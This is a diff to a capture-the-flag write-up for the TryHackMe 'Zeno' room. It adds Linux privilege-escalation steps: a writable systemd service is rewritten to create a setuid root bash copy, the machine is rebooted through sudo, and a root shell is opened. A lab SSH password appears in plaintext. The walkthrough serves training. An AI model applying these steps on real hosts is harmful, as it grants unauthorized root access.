@@ -1,6 +1,6 @@
 # Zeno
 
-**Room Link:** [https://tryhackme.com/room/zeno](https://tryhackme.com/room/zeno)
+**oom Link:** [https://tryhackme.com/room/zeno](https://tryhackme.com/room/zeno)
 
 
 
@@ -172,7 +172,7 @@ Password: FrobjoodAdkoonceanJa
 
 
 
-**Victim**
+**Victim(edward)**
 
 ```
 sudo -l
@@ -182,11 +182,62 @@ sudo -l
 
 
 
+**Victim(apache)**
 
+```
+find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
+```
 
+<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>
 
+**Victim(apache)**
 
+```
+vi /etc/systemd/system/zeno-monitoring.service
+```
 
+**From**
+
+<figure><img src="../../.gitbook/assets/image (808).png" alt=""><figcaption></figcaption></figure>
+
+**To**
+
+```
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+<figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(edward)**
+
+```
+sudo /usr/sbin/reboot
+```
+
+**Kali**
+
+```
+ssh edward@$VICTIM
+Password: FrobjoodAdkoonceanJa
+```
+
+**Victim(edward)**
+
+```
+ls -lah
+./bash_root -p
+```
+
+<figure><img src="../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
 
 
 
